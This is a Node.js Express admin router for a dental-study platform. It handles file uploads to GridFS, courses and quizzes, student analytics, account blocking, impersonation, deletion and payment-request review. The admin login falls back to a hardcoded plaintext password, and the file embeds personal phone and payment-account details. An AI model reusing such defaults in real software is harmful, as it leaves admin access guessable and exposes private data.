const express = require("express");
const jwt = require("jsonwebtoken");
const crypto = require("crypto");
const path = require("path");
const fs = require("fs");
const multer = require("multer");
const { Course, Lesson, Quiz, Progress, Review, User, Subscription, AiChat, SubjectContent, AcademyProfile, PdfAccessRequest, generateId, getFilesBucket, isFilesBucketReady, mongoose } = require("../db");

const router = express.Router();

// Local uploads dir kept only for legacy/dev. New uploads go to MongoDB GridFS so
// they persist across Render restarts.
const uploadsDir = path.resolve(__dirname, "../../../static/uploads");
if (!fs.existsSync(uploadsDir)) {
  fs.mkdirSync(uploadsDir, { recursive: true });
}

const quizUpload = multer({ storage: multer.memoryStorage() });
const contentUpload = multer({
  storage: multer.memoryStorage(),
  limits: { fileSize: 500 * 1024 * 1024 } // 500MB per file
});

// Middleware: stream every uploaded buffer to GridFS, then expose the assigned
// filename on each file object so downstream code (createAssetRecord etc.) keeps
// working without changes.
async function uploadFilesToGridFS(req, _res, next) {
  if (!req.files) {
    return next();
  }

  try {
    const bucket = getFilesBucket();
    for (const fieldName of Object.keys(req.files)) {
      const files = req.files[fieldName];
      if (!Array.isArray(files)) continue;

      for (const file of files) {
        if (!file || !file.buffer) continue;

        const ext = path.extname(file.originalname || "") || "";
        const base = normalizeId(path.basename(file.originalname || "", ext)) || "asset";
        const unique = `${Date.now()}_${Math.random().toString(36).slice(2, 8)}`;
        const filename = `${unique}_${base}${ext}`;

        await new Promise((resolve, reject) => {
          const uploadStream = bucket.openUploadStream(filename, {
            contentType: file.mimetype || "application/octet-stream",
            metadata: { originalName: file.originalname || filename }
          });
          uploadStream.on("error", reject);
          uploadStream.on("finish", resolve);
          uploadStream.end(file.buffer);
        });

        file.filename = filename;
      }
    }
    return next();
  } catch (err) {
    console.error("GridFS upload failed:", err);
    return next(err);
  }
}

function normalizeId(value) {
  return String(value || "")
    .toLowerCase()
    .replace(/[^a-z0-9]+/g, "_")
    .replace(/^_+|_+$/g, "");
}

// Matches filenames inside URLs like /static/uploads/<name> or /api/files/<name>
const FILE_URL_REGEX = /(?:static\/uploads|api\/files)\/([^"'\s?\\)]+)/gi;

// Scans every non-GridFS collection for filenames that are still referenced.
async function collectReferencedFilenames() {
  const referenced = new Set();
  const db = mongoose.connection.db;
  if (!db) return referenced;

  const collections = await db.listCollections().toArray();
  for (const { name } of collections) {
    if (name === "uploads.files" || name === "uploads.chunks") continue;
    const docs = await db.collection(name).find({}).toArray();
    for (const doc of docs) {
      const json = JSON.stringify(doc);
      let match;
      FILE_URL_REGEX.lastIndex = 0;
      while ((match = FILE_URL_REGEX.exec(json)) !== null) {
        try {
          referenced.add(decodeURIComponent(match[1]));
        } catch (_err) {
          referenced.add(match[1]);
        }
      }
    }
  }
  return referenced;
}

// Deletes GridFS files that are no longer referenced by any document. This is
// the ONLY safe way to reclaim MongoDB storage: removing a reference alone
// leaves the file bytes behind, which is what filled the free-tier quota.
async function purgeOrphanGridFs() {
  const stats = { orphanCount: 0, reclaimedBytes: 0, totalBytes: 0 };
  if (!isFilesBucketReady()) return stats;

  const referenced = await collectReferencedFilenames();
  const db = mongoose.connection.db;
  const bucket = getFilesBucket();
  const files = await db.collection("uploads.files").find({}).toArray();

  for (const file of files) {
    stats.totalBytes += file.length || 0;
    if (referenced.has(file.filename)) continue;

    try {
      await bucket.delete(file._id);
      stats.orphanCount += 1;
      stats.reclaimedBytes += file.length || 0;
    } catch (err) {
      console.error(`Failed to delete orphan GridFS file ${file.filename}:`, err.message);
    }
  }
  return stats;
}

// Fire-and-forget cleanup used after content saves so freeing space never
// blocks the HTTP response.
function schedulePurgeOrphanGridFs() {
  purgeOrphanGridFs().catch((err) => {
    console.error("Background GridFS purge failed:", err.message);
  });
}

function splitValues(value) {
  return String(value || "")
    .split(/\r?\n|,/) 
    .map((item) => item.trim())
    .filter(Boolean);
}

function parseTagList(value) {
  return Array.from(new Set(splitValues(value)));
}

function isYoutubeUrl(value) {
  return /(?:youtube\.com|youtu\.be)/i.test(String(value || ""));
}

function normalizeAccessLevel(value) {
  return String(value || "free").trim().toLowerCase() === "paid" ? "paid" : "free";
}

function createAssetRecord(file, kind, index = 0, accessLevel = "free") {
  const ext = path.extname(file.originalname || "");
  const title = path.basename(file.originalname || `${kind}_${index + 1}`, ext) || `${kind} ${index + 1}`;
  const fileUrl = `/static/uploads/${file.filename}`;
  return {
    id: `${kind}_${generateId()}`,
    kind,
    title,
    fileName: file.originalname,
    fileUrl,
    url: fileUrl,
    accessLevel: normalizeAccessLevel(accessLevel),
    mimeType: file.mimetype || "application/octet-stream",
    size: file.size || 0
  };
}

function parseCaseStudies(value) {
  const raw = String(value || "").trim();
  if (!raw) {
    return [];
  }

  if (raw.startsWith("[")) {
    try {
      const parsed = JSON.parse(raw);
      if (Array.isArray(parsed)) {
        return parsed
          .map((item, index) => ({
            id: item.id || `case_${generateId()}`,
            title: String(item.title || `Case Study ${index + 1}`).trim(),
            scenario: String(item.scenario || "").trim(),
            diagnosis: String(item.diagnosis || "").trim(),
            discussion: String(item.discussion || "").trim(),
            relevance: String(item.relevance || "").trim()
          }))
          .filter((item) => item.title || item.scenario || item.discussion || item.diagnosis);
      }
    } catch (_err) {
      // Fall through to block parsing.
    }
  }

  return raw
    .split(/\n\s*---+\s*\n/g)
    .map((block, index) => {
      const caseStudy = {
        id: `case_${generateId()}`,
        title: `Case Study ${index + 1}`,
        scenario: "",
        diagnosis: "",
        discussion: "",
        relevance: ""
      };
      let currentField = "scenario";

      block.split(/\r?\n/).forEach((line) => {
        const match = line.match(/^(title|scenario|diagnosis|discussion|relevance)\s*:\s*(.*)$/i);
        if (match) {
          currentField = match[1].toLowerCase();
          caseStudy[currentField] = match[2].trim();
          return;
        }

        if (!line.trim()) {
          return;
        }

        caseStudy[currentField] = `${caseStudy[currentField]}${caseStudy[currentField] ? "\n" : ""}${line.trim()}`;
      });

      return caseStudy;
    })
    .filter((item) => item.title || item.scenario || item.diagnosis || item.discussion || item.relevance);
}

function parseLineLinks(value, accessLevel) {
  const normalizedAccessLevel = accessLevel ? normalizeAccessLevel(accessLevel) : null;
  return String(value || "")
    .split(/\r?\n/)
    .map((line) => line.trim())
    .filter(Boolean)
    .map((line, index) => {
      const parts = line.split("|").map((part) => part.trim());
      if (parts.length >= 2) {
        const item = {
          title: parts[0] || `Resource ${index + 1}`,
          url: parts.slice(1).join("|") || "#"
        };
        if (normalizedAccessLevel) {
          item.accessLevel = normalizedAccessLevel;
        }
        return item;
      }

      const item = {
        title: `Resource ${index + 1}`,
        url: parts[0] || "#"
      };
      if (normalizedAccessLevel) {
        item.accessLevel = normalizedAccessLevel;
      }
      return item;
    });
}

function sanitizeLinks(value) {
  if (!Array.isArray(value)) {
    return [];
  }

  return value
    .map((item) => {
      if (!item || typeof item !== "object") {
        return null;
      }
      const raw = (item && typeof item.toObject === "function") ? item.toObject() : item;
      const doc = raw && raw._doc ? raw._doc : raw;
      const title = String((doc && doc.title) || "").trim();
      const rawUrl = (doc && doc.url) || "";
      const rawFileUrl = (doc && doc.fileUrl) || "";
      const accessLevel = normalizeAccessLevel((doc && doc.accessLevel) || "free");
      const preferredUrl = (rawUrl && String(rawUrl).trim() !== "#") ? rawUrl : (rawFileUrl || rawUrl || "");
      const url = String(preferredUrl || "").trim();
      if (!title && !url) {
        return null;
      }
      if (!url || url === "#") {
        return null;
      }
      return {
        title: title || url || "Resource",
        url,
        accessLevel
      };
    })
    .filter(Boolean);
}

function mergeUniqueStrings(existingValues, incomingValues) {
  const seen = new Set();
  const merged = [];

  const add = (value) => {
    const normalized = String(value || "").trim();
    if (!normalized) {
      return;
    }
    const key = normalized.toLowerCase();
    if (seen.has(key)) {
      return;
    }
    seen.add(key);
    merged.push(normalized);
  };

  (Array.isArray(existingValues) ? existingValues : []).forEach(add);
  (Array.isArray(incomingValues) ? incomingValues : []).forEach(add);

  return merged;
}

function normalizeBiochemistryTopics(blockKey, topics) {
  const requiredByBlock = {
    "block-a": 1,
    "block-b": 1,
    "block-c": 3
  };

  const normalizedBlockKey = String(blockKey || "").trim().toLowerCase();
  const required = requiredByBlock[normalizedBlockKey];

  const rawTopics = Array.isArray(topics) ? topics : [];
  const expanded = rawTopics.flatMap((topic) => {
    const value = String(topic || "").trim();
    if (!value) {
      return [];
    }

    if (normalizedBlockKey !== "block-c") {
      return [value];
    }

    // Support legacy combined formats like "1.Cervicofacial|2.GIT+UGS|3.Cardiopulmonary".
    return value
      .split(/[|\n,]+/)
      .map((part) => part.replace(/^\s*\d+[.)\-:\s]*/, "").trim())
      .filter(Boolean);
  });

  const normalized = mergeUniqueStrings([], expanded);
  if (!required) {
    return normalized;
  }

  if (normalized.length >= required) {
    return normalized.slice(0, required);
  }

  const filled = [...normalized];
  for (let index = filled.length; index < required; index += 1) {
    filled.push(`Topic ${index + 1}`);
  }
  return filled;
}

function mergeUniqueLinks(existingItems, incomingItems) {
  const seen = new Set();
  const merged = [];

  const add = (item) => {
    if (!item || typeof item !== "object") {
      return;
    }

    const raw = (item && typeof item.toObject === "function") ? item.toObject() : item;
    const doc = raw && raw._doc ? raw._doc : raw;
    const title = String((doc && doc.title) || "").trim();
    const rawUrl = (doc && doc.url) || "";
    const rawFileUrl = (doc && doc.fileUrl) || "";
    const accessLevel = normalizeAccessLevel((doc && doc.accessLevel) || "free");
    const preferredUrl = (rawUrl && String(rawUrl).trim() !== "#") ? rawUrl : (rawFileUrl || rawUrl || "");
    const url = String(preferredUrl || "").trim();

    if (!url || url === "#") {
      return;
    }

    const normalizedTitle = title || url || "Resource";
    const key = `${normalizedTitle.toLowerCase()}|${url.toLowerCase()}`;
    if (seen.has(key)) {
      return;
    }

    seen.add(key);
    merged.push({
      ...doc,
      title: normalizedTitle,
      url,
      accessLevel,
      fileUrl: String((doc && doc.fileUrl) || url).trim()
    });
  };

  (Array.isArray(existingItems) ? existingItems : []).forEach(add);
  (Array.isArray(incomingItems) ? incomingItems : []).forEach(add);

  return merged;
}

async function ensureAcademyProfile() {
  const existing = await AcademyProfile.findOne({ id: "academy_profile" });
  if (existing) {
    return existing;
  }

  return await AcademyProfile.findOneAndUpdate(
    { id: "academy_profile" },
    {
      id: "academy_profile",
      aboutAcademyText: "Dental Prep is your structured BDS preparation platform where each subject is organized into simple blocks, helping students move from fundamentals to clinical confidence.",
      bankDetails: {
          bankName: "Meezan Bank",
          accountTitle: "Dental Prep Official",
          accountNumber: "0123456789",
          iban: "PK00 MEZN 0000 0000 0000 0000"
      },
      generalOverview: {
        books: [{ title: "BDS Core Reading List", url: "#" }],
        premiumNotes: [{ title: "Premium Notes Pack", url: "#" }],
        importantSlides: [{ title: "Important Slides Collection", url: "#" }],
        shortNotes: [{ title: "Short Notes for Final Revision", url: "#" }],
        videos: Array.from({ length: 6 }).map((_, index) => ({
          title: `General Overview Video ${index + 1}`,
          url: "https://www.youtube.com/@pulseprepofficial"
        }))
      },
      aboutUs: {
        profileImageUrl: "/static/images/favicon.png",
        introVideoUrl: "https://www.youtube.com/@pulseprepofficial",
        notes: [{ title: "Academy Intro Notes", url: "#" }],
        pdfResources: [{ title: "Academy Resource PDF", url: "#" }],
        contactEmail: "admin@dentalprep.com",
        contactNumbers: ["+92 335 9591271"],
        socialLinks: {
          facebook: "https://facebook.com/profile.php?id=61576776451528",
          youtube: "https://www.youtube.com/@pulseprepofficial",
          instagram: "https://instagram.com/pulseprepofficial",
          linkedin: "https://linkedin.com/in/pulse-prep-778292368"
        }
      }
    },
    { new: true, upsert: true }
  );
}

async function buildStudentAnalytics() {
  const courses = await Course.find({});
  const lessons = await Lesson.find({});
  const quizzes = await Quiz.find({});
  const progressItems = await Progress.find({});
  const students = (await User.find({})).filter((user) => user.role !== "admin");

  const coursesById = courses.reduce((acc, course) => {
    acc[course.courseId] = course;
    return acc;
  }, {});
  const lessonsById = lessons.reduce((acc, lesson) => {
    acc[lesson.lessonId] = lesson;
    return acc;
  }, {});
  const quizzesById = quizzes.reduce((acc, quiz) => {
    acc[quiz.quizId] = quiz;
    return acc;
  }, {});
  const totalTrackableItems = lessons.length + quizzes.length;

  return students
    .map((student) => {
      const userProgress = progressItems.filter((item) => item.userId === student._id);
      const completedLessons = userProgress.filter((item) => item.itemType === "lesson" && item.completed).length;
      const quizAttempts = userProgress.filter((item) => item.itemType === "quiz");
      const avgScore = quizAttempts.length
        ? Math.round(quizAttempts.reduce((sum, item) => sum + (Number(item.score) || 0), 0) / quizAttempts.length)
        : 0;
      const weakAreas = quizAttempts
        .filter((item) => Number(item.score) < 70)
        .sort((left, right) => Number(left.score) - Number(right.score))
        .slice(0, 3)
        .map((item) => {
          const quiz = quizzesById[item.quizId || item.referenceId];
          const lesson = lessonsById[item.lessonId || quiz?.lessonId];
          const course = coursesById[item.courseId || lesson?.courseId || quiz?.courseId];
          return {
            quizTitle: quiz ? quiz.title : item.title || "Quiz",
            lessonTitle: lesson ? lesson.title : "Lesson",
            courseTitle: course ? course.title : item.courseId,
            score: Number(item.score) || 0
          };
        });

      return {
        userId: student._id,
        name: student.name || "Student",
        email: student.email || "",
        completedLessons,
        quizAttempts: quizAttempts.length,
        avgScore,
        completionRate: totalTrackableItems
          ? Math.round(((completedLessons + quizAttempts.filter((item) => item.completed).length) / totalTrackableItems) * 100)
          : 0,
        weakAreas,
        updatedAt: userProgress[0]?.updatedAt || student.updatedAt || student.createdAt
      };
    })
    .sort((left, right) => right.completionRate - left.completionRate || right.avgScore - left.avgScore);
}

async function buildManagedStudents() {
  const courses = await Course.find({});
  const lessons = await Lesson.find({});
  const quizzes = await Quiz.find({});
  const progressItems = await Progress.find({});
  const students = (await User.find({})).filter((user) => user.role !== "admin");

  const coursesById = courses.reduce((acc, course) => {
    acc[course.courseId] = course;
    return acc;
  }, {});
  const lessonsById = lessons.reduce((acc, lesson) => {
    acc[lesson.lessonId] = lesson;
    return acc;
  }, {});
  const quizzesById = quizzes.reduce((acc, quiz) => {
    acc[quiz.quizId] = quiz;
    return acc;
  }, {});
  const totalTrackableItems = lessons.length + quizzes.length;

  return students
    .map((student) => {
      const userProgress = progressItems.filter((item) => item.userId === student._id);
      const completedLessons = userProgress.filter((item) => item.itemType === "lesson" && item.completed).length;
      const quizAttempts = userProgress.filter((item) => item.itemType === "quiz");
      const avgScore = quizAttempts.length
        ? Math.round(quizAttempts.reduce((sum, item) => sum + (Number(item.score) || 0), 0) / quizAttempts.length)
        : 0;

      return {
        userId: student._id,
        name: student.name || "Student",
        email: student.email || "",
        role: student.role || "student",
        isVerified: Boolean(student.isVerified),
        accountStatus: student.accountStatus || "active",
        completedLessons,
        quizAttempts: quizAttempts.length,
        avgScore,
        completionRate: totalTrackableItems
          ? Math.round(((completedLessons + quizAttempts.filter((item) => item.completed).length) / totalTrackableItems) * 100)
          : 0,
        weakAreas: quizAttempts
          .filter((item) => Number(item.score) < 70)
          .sort((left, right) => Number(left.score) - Number(right.score))
          .slice(0, 3)
          .map((item) => {
            const quiz = quizzesById[item.quizId || item.referenceId];
            const lesson = lessonsById[item.lessonId || quiz?.lessonId];
            const course = coursesById[item.courseId || lesson?.courseId || quiz?.courseId];
            return {
              quizTitle: quiz ? quiz.title : item.title || "Quiz",
              lessonTitle: lesson ? lesson.title : "Lesson",
              courseTitle: course ? course.title : item.courseId,
              score: Number(item.score) || 0
            };
          }),
        updatedAt: userProgress[0]?.updatedAt || student.updatedAt || student.createdAt
      };
    })
    .sort((left, right) => right.completionRate - left.completionRate || right.avgScore - left.avgScore);
}

function createTemporaryPassword() {
  return crypto.randomBytes(6).toString("base64url").replace(/[^a-zA-Z0-9]/g, "").slice(0, 10) || `Temp${generateId().slice(0, 6)}`;
}

function adminAuth(req, res, next) {
  const authHeader = req.headers.authorization || "";
  const token = authHeader.startsWith("Bearer ") ? authHeader.slice(7) : null;

  if (!token) {
    return res.status(401).json({ message: "Missing admin token" });
  }

  try {
    const decoded = jwt.verify(token, process.env.JWT_SECRET);
    if (decoded.role !== "admin") {
      return res.status(403).json({ message: "Forbidden" });
    }
    req.admin = decoded;
    return next();
  } catch (_err) {
    return res.status(401).json({ message: "Invalid admin token" });
  }
}

router.post("/admin/login", (req, res) => {
  const { email, password } = req.body || {};
  const adminEmail = process.env.ADMIN_EMAIL || "admin@dentalprep.com";
  const adminPassword = process.env.ADMIN_PASSWORD || "Yousaf12+-";

  if (email !== adminEmail || password !== adminPassword) {
    return res.status(401).json({ message: "Invalid admin credentials" });
  }

  const token = jwt.sign({ role: "admin", email }, process.env.JWT_SECRET, { expiresIn: "7d" });
  return res.json({ token });
});

router.post("/admin/course", adminAuth, async (req, res) => {
  try {
    const { title, description, category, curriculumTags, courseId } = req.body || {};
    if (!title) {
      return res.status(400).json({ message: "Title is required" });
    }

    const id = courseId || `course_${normalizeId(title)}`;
    const course = await Course.findOneAndUpdate(
      { courseId: id },
      {
        courseId: id,
        title,
        description: String(description || "").trim(),
        category: String(category || "").trim(),
        curriculumTags: parseTagList(curriculumTags)
      },
      { new: true, upsert: true }
    );

    return res.status(201).json({
      course: {
        id: course.courseId,
        title: course.title,
        description: course.description || "",
        category: course.category || "",
        curriculumTags: course.curriculumTags || []
      }
    });
  } catch (_err) {
    return res.status(500).json({ message: "Server error" });
  }
});

router.delete("/admin/course/:courseId", adminAuth, async (req, res) => {
  try {
    const courseId = String(req.params.courseId || "").trim();
    if (!courseId) {
      return res.status(400).json({ message: "Course ID is required" });
    }

    const course = await Course.findOne({ courseId });
    if (!course) {
      return res.status(404).json({ message: "Course not found" });
    }

    const lessonRows = await Lesson.find({ courseId }, { lessonId: 1 });
    const lessonIds = lessonRows.map((row) => row.lessonId).filter(Boolean);

    const directQuizRows = await Quiz.find({ courseId }, { quizId: 1 });
    const lessonQuizRows = lessonIds.length ? await Quiz.find({ lessonId: { $in: lessonIds } }, { quizId: 1 }) : [];
    const quizIds = Array.from(new Set([...directQuizRows, ...lessonQuizRows].map((row) => row.quizId).filter(Boolean)));

    const progressOrFilters = [{ courseId }];
    if (lessonIds.length) {
      progressOrFilters.push({ lessonId: { $in: lessonIds } });
      progressOrFilters.push({ referenceId: { $in: lessonIds } });
    }
    if (quizIds.length) {
      progressOrFilters.push({ quizId: { $in: quizIds } });
      progressOrFilters.push({ referenceId: { $in: quizIds } });
    }

    const [deletedLessons, deletedQuizzes, deletedReviews, deletedProgress, deletedCourse] = await Promise.all([
      Lesson.deleteMany({ courseId }),
      Quiz.deleteMany({ $or: [{ courseId }, ...(lessonIds.length ? [{ lessonId: { $in: lessonIds } }] : [])] }),
      Review.deleteMany({ courseId }),
      Progress.deleteMany({ $or: progressOrFilters }),
      Course.deleteOne({ courseId })
    ]);

    return res.json({
      message: "Course and related data deleted permanently",
      deleted: {
        course: deletedCourse.deletedCount || 0,
        lessons: deletedLessons.deletedCount || 0,
        quizzes: deletedQuizzes.deletedCount || 0,
        reviews: deletedReviews.deletedCount || 0,
        progress: deletedProgress.deletedCount || 0
      }
    });
  } catch (_err) {
    return res.status(500).json({ message: "Server error" });
  }
});

// GET /api/courses - Get all courses for admin dropdown (requires admin auth)
router.get("/admin/courses", adminAuth, async (_req, res) => {
  try {
    const courses = await Course.find({}).sort({ title: 1 });
    const allLessons = await Lesson.find({});
    const allQuizzes = await Quiz.find({});
    
    const data = courses.map((course) => {
      const courseLessons = allLessons.filter((lesson) => lesson.courseId === course.courseId);
      const courseQuizzes = allQuizzes.filter((quiz) => quiz.courseId === course.courseId);
      
      return {
        id: course.courseId,
        title: course.title,
        description: course.description || "",
        category: course.category || "",
        curriculumTags: course.curriculumTags || [],
        lessonsCount: courseLessons.length,
        quizCount: courseQuizzes.length
      };
    });
    
    res.json({ courses: data });
  } catch (_err) {
    return res.status(500).json({ message: "Server error" });
  }
});

// GET /api/lessons - Get all lessons for admin panel (requires admin auth)
router.get("/admin/lessons", adminAuth, async (_req, res) => {
  try {
    const lessons = await Lesson.find({}).sort({ title: 1 });
    const data = lessons.map((lesson) => ({
      id: lesson.lessonId,
      title: lesson.title,
      courseId: lesson.courseId,
      summary: lesson.summary || "",
      videoUrl: lesson.videoUrl || ""
    }));
    res.json({ lessons: data });
  } catch (_err) {
    return res.status(500).json({ message: "Server error" });
  }
});

// GET /api/quizzes - Get all quizzes for admin panel (requires admin auth)
router.get("/admin/quizzes", adminAuth, async (_req, res) => {
  try {
    const quizzes = await Quiz.find({}).sort({ title: 1 });
    const data = quizzes.map((quiz) => ({
      id: quiz.quizId,
      title: quiz.title,
      courseId: quiz.courseId,
      lessonId: quiz.lessonId,
      questionCount: (quiz.questions || []).length
    }));
    res.json({ quizzes: data });
  } catch (_err) {
    return res.status(500).json({ message: "Server error" });
  }
});

router.get("/admin/overview", adminAuth, async (_req, res) => {
  try {
    const courses = await Course.find({});
    const lessons = await Lesson.find({});
    const quizzes = await Quiz.find({});
    const progressItems = (await Progress.find({})).sort((left, right) => new Date(right.updatedAt || right.createdAt || 0) - new Date(left.updatedAt || left.createdAt || 0));
    const reviews = (await Review.find({})).sort((left, right) => new Date(right.updatedAt || right.createdAt || 0) - new Date(left.updatedAt || left.createdAt || 0));
    const quizAttempts = progressItems.filter((item) => item.itemType === "quiz" || item.quizId);
    const usersById = (await User.find({})).reduce((acc, user) => {
      acc[user._id] = user;
      return acc;
    }, {});
    const quizzesById = quizzes.reduce((acc, quiz) => {
      acc[quiz.quizId] = quiz;
      return acc;
    }, {});
    const coursesById = courses.reduce((acc, course) => {
      acc[course.courseId] = course;
      return acc;
    }, {});
    const studentAnalytics = await buildStudentAnalytics();

    const recentResults = quizAttempts
      .map((item) => {
        const user = usersById[item.userId];
        const quiz = quizzesById[item.quizId || item.referenceId] || null;
        const course = coursesById[item.courseId] || null;
        return {
          id: item._id,
          userName: user ? user.name : "Student",
          userEmail: user ? user.email : "",
          quizTitle: quiz ? quiz.title : item.title || "Quiz",
          courseTitle: course ? course.title : item.courseId,
          score: item.score || 0,
          completed: Boolean(item.completed),
          updatedAt: item.updatedAt || item.createdAt
        };
      })
      .slice(0, 10);

    const recentReviews = reviews
      .map((review) => {
        const user = usersById[review.userId];
        const course = coursesById[review.courseId];
        return {
          id: review._id,
          userName: user ? user.name : review.userName || "Student",
          courseTitle: course ? course.title : review.courseId,
          rating: review.rating,
          comment: review.comment,
          createdAt: review.createdAt
        };
      })
      .slice(0, 10);

    const audioCount = lessons.reduce((sum, lesson) => sum + ((lesson.audioItems || []).length || 0), 0);
    const materialCount = lessons.reduce((sum, lesson) => sum + ((lesson.materials || []).length || 0), 0);
    const caseStudyCount = lessons.reduce((sum, lesson) => sum + ((lesson.caseStudies || []).length || 0), 0);

    return res.json({
      counts: {
        courses: courses.length,
        lessons: lessons.length,
        quizzes: quizzes.length,
        quizAttempts: quizAttempts.length,
        reviews: reviews.length,
        students: studentAnalytics.length,
        audios: audioCount,
        materials: materialCount,
        caseStudies: caseStudyCount
      },
      recentResults,
      recentReviews,
      studentAnalytics: studentAnalytics.slice(0, 5)
    });
  } catch (_err) {
    return res.status(500).json({ message: "Server error" });
  }
});

router.get("/admin/student-analytics", adminAuth, async (_req, res) => {
  try {
    return res.json({ students: await buildStudentAnalytics() });
  } catch (_err) {
    return res.status(500).json({ message: "Server error" });
  }
});

router.get("/admin/users", adminAuth, async (_req, res) => {
  try {
    return res.json({ students: await buildManagedStudents() });
  } catch (_err) {
    return res.status(500).json({ message: "Server error" });
  }
});

router.post("/admin/users/:userId/block", adminAuth, async (req, res) => {
  try {
    const userId = String(req.params.userId || "").trim();
    const user = await User.findById(userId);
    if (!user) {
      return res.status(404).json({ message: "User not found" });
    }
    if ((user.role || "student") === "admin") {
      return res.status(403).json({ message: "Admin accounts cannot be blocked" });
    }

    const updated = await User.findByIdAndUpdate(userId, {
      accountStatus: "blocked",
      updatedAt: new Date()
    }, { new: true });

    return res.json({
      message: "User blocked",
      user: {
        id: updated._id,
        name: updated.name,
        email: updated.email,
        accountStatus: updated.accountStatus || "blocked"
      }
    });
  } catch (_err) {
    return res.status(500).json({ message: "Server error" });
  }
});

router.post("/admin/users/:userId/approve", adminAuth, async (req, res) => {
  try {
    const userId = String(req.params.userId || "").trim();
    const user = await User.findById(userId);
    if (!user) {
      return res.status(404).json({ message: "User not found" });
    }
    if ((user.role || "student") === "admin") {
      return res.status(403).json({ message: "Admin account cannot be changed" });
    }

    const updated = await User.findByIdAndUpdate(userId, {
      accountStatus: "active",
      updatedAt: new Date()
    }, { new: true });

    return res.json({
      message: "Student approved successfully",
      user: {
        id: updated._id,
        name: updated.name,
        email: updated.email,
        accountStatus: updated.accountStatus || "active"
      }
    });
  } catch (_err) {
    return res.status(500).json({ message: "Server error" });
  }
});

router.post("/admin/users/:userId/reject", adminAuth, async (req, res) => {
  try {
    const userId = String(req.params.userId || "").trim();
    const user = await User.findById(userId);
    if (!user) {
      return res.status(404).json({ message: "User not found" });
    }
    if ((user.role || "student") === "admin") {
      return res.status(403).json({ message: "Admin account cannot be changed" });
    }

    const updated = await User.findByIdAndUpdate(userId, {
      accountStatus: "blocked",
      updatedAt: new Date()
    }, { new: true });

    return res.json({
      message: "Student rejected",
      user: {
        id: updated._id,
        name: updated.name,
        email: updated.email,
        accountStatus: updated.accountStatus || "blocked"
      }
    });
  } catch (_err) {
    return res.status(500).json({ message: "Server error" });
  }
});

router.post("/admin/users/:userId/unblock", adminAuth, async (req, res) => {
  try {
    const userId = String(req.params.userId || "").trim();
    const user = await User.findById(userId);
    if (!user) {
      return res.status(404).json({ message: "User not found" });
    }
    if ((user.role || "student") === "admin") {
      return res.status(403).json({ message: "Admin accounts do not use block status" });
    }

    const updated = await User.findByIdAndUpdate(userId, {
      accountStatus: "active",
      updatedAt: new Date()
    }, { new: true });

    return res.json({
      message: "User unblocked",
      user: {
        id: updated._id,
        name: updated.name,
        email: updated.email,
        accountStatus: updated.accountStatus || "active"
      }
    });
  } catch (_err) {
    return res.status(500).json({ message: "Server error" });
  }
});

router.post("/admin/users/:userId/reset-password", adminAuth, async (req, res) => {
  try {
    const userId = String(req.params.userId || "").trim();
    const user = await User.findById(userId);
    if (!user) {
      return res.status(404).json({ message: "User not found" });
    }
    if ((user.role || "student") === "admin") {
      return res.status(403).json({ message: "Admin password is managed separately" });
    }

    const tempPassword = String(req.body?.password || "").trim() || createTemporaryPassword();
    const bcrypt = require("bcryptjs");
    const passwordHash = await bcrypt.hash(tempPassword, 10);

    await User.findByIdAndUpdate(userId, {
      passwordHash,
      password: undefined,
      resetPasswordToken: null,
      resetPasswordExpires: null,
      updatedAt: new Date()
    });

    return res.json({
      message: "Password reset successfully",
      tempPassword
    });
  } catch (_err) {
    return res.status(500).json({ message: "Server error" });
  }
});

router.post("/admin/users/:userId/impersonate", adminAuth, async (req, res) => {
  try {
    const userId = String(req.params.userId || "").trim();
    const user = await User.findById(userId);
    if (!user) {
      return res.status(404).json({ message: "User not found" });
    }
    if ((user.role || "student") === "admin") {
      return res.status(403).json({ message: "Admin account impersonation is not allowed" });
    }

    const token = jwt.sign(
      {
        id: user._id,
        email: user.email,
        role: user.role || "student",
        impersonatedBy: req.admin.email,
        impersonatedByRole: "admin"
      },
      process.env.JWT_SECRET,
      { expiresIn: "7d" }
    );

    return res.json({
      token,
      user: {
        id: user._id,
        name: user.name,
        email: user.email,
        role: user.role || "student",
        accountStatus: user.accountStatus || "active"
      }
    });
  } catch (_err) {
    return res.status(500).json({ message: "Server error" });
  }
});

router.delete("/admin/users/:userId", adminAuth, async (req, res) => {
  try {
    const userId = String(req.params.userId || "").trim();
    const user = await User.findById(userId);
    if (!user) {
      return res.status(404).json({ message: "User not found" });
    }
    if ((user.role || "student") === "admin") {
      return res.status(403).json({ message: "Admin accounts cannot be deleted here" });
    }

    await Promise.all([
      Progress.deleteMany({ userId }),
      Subscription.deleteMany({ userId }),
      Review.deleteMany({ userId }),
      AiChat.deleteMany({ userId }),
      PdfAccessRequest.deleteMany({ userId }),
      User.deleteOne({ _id: userId })
    ]);

    return res.json({ message: "User deleted permanently" });
  } catch (_err) {
    return res.status(500).json({ message: "Server error" });
  }
});

router.get("/admin/pdf-access-requests", adminAuth, async (_req, res) => {
  try {
    const requests = await PdfAccessRequest.find({});
    const usersById = (await User.find({})).reduce((acc, user) => {
      acc[user._id] = user;
      return acc;
    }, {});

    const items = requests
      .sort((a, b) => new Date(b.updatedAt || b.createdAt || 0) - new Date(a.updatedAt || a.createdAt || 0))
      .map((request) => {
        const user = usersById[request.userId];
        return {
          id: request._id,
          userId: request.userId,
          userName: user ? user.name : "Student",
          userEmail: user ? user.email : "",
          subjectKey: request.subjectKey,
          blockKey: request.blockKey,
          sectionName: request.sectionName,
          amount: Number(request.amount || 500),
          paymentMethod: request.paymentMethod || "easypaisa",
          easypaisaNumber: request.easypaisaNumber || "03327939323",
          easypaisaAccountName: request.easypaisaAccountName || "Muhammad Yousaf",
          paymentProof: request.paymentProof || "",
          status: request.status || "pending",
          adminNote: request.adminNote || "",
          reviewedBy: request.reviewedBy || "",
          reviewedAt: request.reviewedAt || null,
          createdAt: request.createdAt || null
        };
      });

    return res.json({ requests: items });
  } catch (_err) {
    return res.status(500).json({ message: "Server error" });
  }
});

router.post("/admin/pdf-access-requests/:requestId/approve", adminAuth, async (req, res) => {
  try {
    const requestId = String(req.params.requestId || "").trim();
    const request = await PdfAccessRequest.findOne({ _id: requestId });
    if (!request) {
      return res.status(404).json({ message: "Request not found" });
    }

    const updated = await PdfAccessRequest.findOneAndUpdate(
      { _id: requestId },
      {
        status: "approved",
        reviewedBy: req.admin.email || "admin",
        reviewedAt: new Date(),
        adminNote: String(req.body?.adminNote || "Approved").trim(),
        updatedAt: new Date()
      },
      { new: true }
    );

    return res.json({ message: "PDF access approved", request: updated });
  } catch (_err) {
    return res.status(500).json({ message: "Server error" });
  }
});

